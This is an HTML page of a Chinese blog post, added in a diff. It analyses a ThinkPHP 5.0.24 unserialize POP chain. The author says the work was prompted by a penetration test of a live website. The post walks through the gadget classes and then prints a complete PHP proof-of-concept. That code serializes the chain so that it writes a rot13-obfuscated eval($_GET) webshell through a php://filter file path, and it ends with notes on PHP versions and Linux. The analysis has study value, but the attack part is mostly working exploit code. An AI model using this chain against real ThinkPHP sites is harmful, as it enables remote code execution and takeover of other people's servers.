@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="tp5.0.24反序列化漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="tp," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/14/tp5-0-24反序列化漏洞复现/"/>
+
+
+<meta name="description" content="昨夜对一h网进行渗透测试，该网站是基于tp5.0.24二次开发的，就想着自己也分析一下（主要是没给poc哈哈）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tp5.0.24反序列化漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/14/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:description" content="昨夜对一h网进行渗透测试，该网站是基于tp5.0.24二次开发的，就想着自己也分析一下（主要是没给poc哈哈）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-41-42.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-45-07.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png">
+<meta property="article:published_time" content="2020-03-13T23:21:02.000Z">
+<meta property="article:modified_time" content="2020-03-15T06:39:38.150Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="tp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=543697255&auto=1&height=66"></iframe>
+    <title> tp5.0.24反序列化漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          tp5.0.24反序列化漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 14 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>昨夜对一h网进行渗透测试，该网站是基于tp5.0.24二次开发的，就想着自己也分析一下（主要是没给poc哈哈）</p>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#一-获取漏洞">一、获取漏洞</a></li>
+<li><a href="#二-漏洞分析">二、漏洞分析</a></li>
+<li><a href="#三-poc编写">三、POC编写</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>力哥挖的嗷😁</p>
+<p><img src="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg" alt="TIM图片20200314072347.jpg"></p>
+<h4><span id="一-获取漏洞">一、获取漏洞</span></h4><blockquote>
+<p><a href="http://www.thinkphp.cn/donate/download/id/1279.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1279.html</a> </p>
+</blockquote>
+<p><code>application/index/controller/Index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace appindexcontroller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input&#x3D;&#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Welcome thinkphp 5.0.24&quot;;</span><br><span class="line">        echo $input;</span><br><span class="line">        unserialize($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/tp5.0.24/public/index.php</code></p>
+<h4><span id="二-漏洞分析">二、漏洞分析</span></h4><p>虽然之前自己没有分析过tp5.0.x的反序列化，因为tp5.0.0~tp5.0.23有一条直接RCE的POP链，但是想来也差不多。而tp5.0.24中对传入的<code>_method</code>进行白名单限制，因此无法调用任意类方法。</p>
+<p>Thinkphp 5.0.x反序列化最后触发RCE，要调用的<code>Request</code>类<code>__call</code>方法，因此也被限制。</p>
+<p><img src="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png" alt="Snipaste_2020-03-14_07-56-35.png"></p>
+<p>需要寻找其他的<code>__call</code>方法，然后力哥找到了下面这里</p>
+<p><code>Output.php</code></p>
+<p><img src="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png" alt="Snipaste_2020-03-14_08-01-21.png"></p>
+<p>追踪<code>block()</code>方法</p>
+<p><img src="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png" alt="Snipaste_2020-03-14_08-03-35.png"></p>
+<p>存在文件写入，可以利用。</p>
+<hr>
+<p><strong>开始分析POP链</strong></p>
+<p>看了下发现tp5.0.x、tp5.1.x、tp5.2.x 反序列化入口点都是一样的</p>
+<p><code>thinkphp/library/think/process/pipes/Windows.php</code></p>
+<p><img src="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png" alt="Snipaste_2020-03-14_08-13-36.png"></p>
+<p>追踪<code>removeFiles()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png" alt="Snipaste_2020-03-14_08-14-07.png"></p>
+<p>这里的<code>file_exist()</code>触发<code>__toString()</code>，因此可以作为跳板</p>
+<p>全局搜索<code>__toString()</code>寻找利用点</p>
+<p><code>thinkphp/library/think/Model.php</code></p>
+<p><img src="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png" alt="Snipaste_2020-03-14_08-18-41.png"></p>
+<p>追踪<code>toJson()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png" alt="Snipaste_2020-03-14_08-19-15.png"></p>
+<p>追踪<code>toArray()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png" alt="Snipaste_2020-03-14_08-28-21.png"></p>
+<p>存在这三个动态方法调用，最后只有第三处可行</p>
+<p>因为要作为跳板，想办法控制<code>$value</code>和<code>$attr</code></p>
+<p><img src="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png" alt="Snipaste_2020-03-14_08-35-20.png"></p>
+<p>这里的<code>parseName()</code>是个字符串命名风格转换，基本没啥变化</p>
+<p>控制<code>$modelRelation</code>需要在当前类中寻找一个无参方法</p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-41-42.png" alt="Snipaste_2020-03-14_08-41-42"></p>
+<p>跟进<code>getRelationData()</code></p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-45-07.png" alt="Snipaste_2020-03-14_08-45-07"></p>
+<p>这个方法说明是获取关联模型数据，需要满足第一个if条件，这里比较麻烦，先看下面。假设满足，返回<code>$this-&gt;parent</code></p>
+<p>接下来需要寻找一个有<code>getBindAttr()</code>方法的类，全局搜索发现只有一个<code>OneToOne</code>类</p>
+<p><img src="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png" alt="Snipaste_2020-03-14_09-14-38.png"></p>
+<p>也是可控的，因为是抽象类，寻找继承<code>OneToOne()</code>的类，并且满足前面那个if条件，最终发现<code>HasOne</code>类可用，具体变量值等下调试看看结果</p>
+<p>之后就是利用<code>$value-&gt;getAttr($attr)</code>这个跳板触发<code>Output</code>类中的<code>__call()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png" alt="Snipaste_2020-03-14_10-34-42.png"></p>
+<p><code>block()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png" alt="Snipaste_2020-03-14_10-35-00.png"></p>
+<p><code>writeln()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png" alt="Snipaste_2020-03-14_10-35-17.png"></p>
+<p><code>write()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png" alt="Snipaste_2020-03-14_10-35-42.png"></p>
+<p><code>$this-&gt;handle</code>可控，可以作为跳板，全局搜索<code>write()</code></p>
+<p><code>thinkphp/library/think/session/driver/Memcached.php</code></p>
+<p><img src="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png" alt="Snipaste_2020-03-15_12-44-47.png"></p>
+<p>可作为跳板，全局搜索<code>-&gt;set</code></p>
+<p><code>thinkphp/library/think/cache/driver/File.php</code></p>
+<p><img src="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png" alt="Snipaste_2020-03-14_10-40-57.png"></p>
+<p><code>$filename</code>可控因此可以用伪协议绕过exit，但是这里的<code>$data</code>根据传参为布尔型，</p>
+<p>跟进<code>setTagItem()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png" alt="Snipaste_2020-03-14_10-50-13.png"></p>
+<p>这里的<code>$value</code>可控即传入的<code>$name</code>，是前面的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $this-&gt;getCacheKey($name, true);</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>getCacheKey()</code></p>
+<p><img src="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png" alt="Snipaste_2020-03-14_21-19-29.png"></p>
+<p>这里需要利用伪协议<code>php://filter/write=string.rot13/resource=./cuc cucvasb();?&gt;</code>作为文件名，从而实现文件写入</p>
+<p>至此，POP链完成</p>
+<p>可以参考力哥的POP链图</p>
+<h4><span id="三-poc编写">三、POC编写</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;#Windows</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows&#123;&#x2F;&#x2F;不使用继承</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;files &#x3D; [new Pivot()];&#x2F;&#x2F;触发Model __toString(),Model子类Pivot合适</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">use think\console\Output;</span><br><span class="line">class Query&#123;</span><br><span class="line">	protected $model;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;model &#x3D; new Output();&#x2F;&#x2F;get_class($modelRelation-&gt;getModel()) &#x3D;&#x3D; get_class($this-&gt;parent)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Relation&#123;</span><br><span class="line">	protected $selfRelation;</span><br><span class="line">	protected $query;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;selfRelation &#x3D; false;&#x2F;&#x2F;满足if语句</span><br><span class="line">		$this-&gt;query &#x3D; new Query();&#x2F;&#x2F;满足if语句</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;#OneToOne HasOne</span><br><span class="line">use think\model\Relation;&#x2F;&#x2F;使用了Relation类</span><br><span class="line">abstract class OneToOne extends Relation&#123;&#x2F;&#x2F;需要$selfRelation和$query，使用继承</span><br><span class="line">	protected $bindAttr &#x3D; [];</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		parent::__construct();</span><br><span class="line">		$this-&gt;bindAttr &#x3D; [&#39;key&#39;,&#39;value&#39;];&#x2F;&#x2F;即$bindAttr</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\cache;#Driver</span><br><span class="line">abstract class Driver&#123;</span><br><span class="line">	protected $tag;</span><br><span class="line">	protected $options &#x3D; [];</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;tag &#x3D; true;&#x2F;&#x2F;满足if ($this-&gt;tag &amp;&amp; !is_file($filename)) </span><br><span class="line">		$this-&gt;options &#x3D; [</span><br><span class="line">			&#x2F;&#x2F; &#39;path&#39; &#x3D;&gt; &#39;.&#x2F;demo&#x2F;&#39;,</span><br><span class="line">			&#39;path&#39; &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;.&#x2F;demo&#x2F;&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;,</span><br><span class="line">			&#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">			&#39;expire&#39; &#x3D;&gt; 0,</span><br><span class="line">			&#39;cache_subdir&#39; &#x3D;&gt; false,&#x2F;&#x2F;if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span><br><span class="line">			&#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">		];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;#File</span><br><span class="line">use think\cache\Driver;</span><br><span class="line">class File extends Driver&#123;&#x2F;&#x2F;需要$tag以及setTagItem()，使用继承</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached&#123;&#x2F;&#x2F;因为这里没用到SessionHandler，因此没必要继承</span><br><span class="line">	protected $handler &#x3D; null;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;handler &#x3D; new File();&#x2F;&#x2F;$this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output&#123;</span><br><span class="line">	protected $styles &#x3D; [];</span><br><span class="line">	private $handle &#x3D; null;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$this-&gt;styles &#x3D; [&#39;getAttr&#39;];&#x2F;&#x2F;满足if (in_array($method, $this-&gt;styles)) </span><br><span class="line">    	$this-&gt;handle &#x3D; new Memcached();&#x2F;&#x2F;$this-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think;#Model</span><br><span class="line">use think\model\Relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">abstract class Model &#123;</span><br><span class="line">	protected $append &#x3D; [];</span><br><span class="line">	protected $error;</span><br><span class="line">	public $parent;&#x2F;&#x2F;坑点</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;append &#x3D; [&#39;key&#39;&#x3D;&gt;&#39;getError&#39;];&#x2F;&#x2F;value为$relation,因此为getError</span><br><span class="line">		$this-&gt;error &#x3D; new HasOne();&#x2F;&#x2F;即$modelRealtion</span><br><span class="line">		$this-&gt;parent &#x3D; new Output();&#x2F;&#x2F;即$value</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model;#Pivot</span><br><span class="line">use think\Model;</span><br><span class="line">class Pivot extends Model&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">$a &#x3D; base64_encode(serialize(new Windows()));</span><br><span class="line">echo $a;</span><br><span class="line">var_dump(unserialize(base64_decode($a)));</span><br></pre></td></tr></table></figure>
+
+<p>有个3个需要注意的地方</p>
+<p>*<em>一、model子类Pivot中也有该变量parent，属性为public；而基类model的parent为protected *</em></p>
+<p>将<code>Model</code>类中的parent设为public，但是对于php版本似乎仍有要求。。<code>php7.3.12</code>失败，测试<code>5.6.40，7.3.8，7.0.33</code>可用</p>
+<p><strong>二、Windows下使用<code>php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;</code>无法正常反序列化，调试发现只能正常初始化Windows类，并且Windows下不支持这种文件名</strong></p>
+<p>切换到Linux下</p>
+<p><strong>三、如果网站不允许写文件，可以先创建一个755的目录</strong></p>
+<p><code>getCacheKey()</code>方法，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">	mkdir($dir, 0755, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$auto</code>为true，将<code>path</code>设为<code>./demo</code></p>
+<p>分析下最后的调用</p>
+<p>第一次<code>set(&#39;&lt;getAttr&gt;key&lt;getAttr&gt;&#39;, true, expire=3000)</code></p>
+<p><code>setTagItem(path+md5(name)+.php)</code></p>
+<p>第二次<code>set(tag_md5(1), path+md5(name)+.php)</code></p>
+<p><code>file_put_contents(path+md5(name)+.php, &lt;?php\n//000000000000\n exit();?&gt;\n+serialize(path+md5(name)+.php))</code></p>
+<hr>
+<p>注意下<code>?</code>的url编码</p>
+<p><img src="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png" alt="Snipaste_2020-03-15_13-50-20.png"></p>
+<hr>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7</a> </p>
+<p> <a href="http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.0.24反序列化链分析/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/?tdsourcetag=s_pctim_aiomsg</a> </p>
+<p> <a href="https://xz.aliyun.com/t/7082" target="_blank" rel="noopener">https://xz.aliyun.com/t/7082</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/tp/" rel="tag"><i class="fa fa-tag"></i> tp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/13/FRP%E6%90%AD%E5%BB%BA/">
+        <span class="next-text nav-default">FRP搭建</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
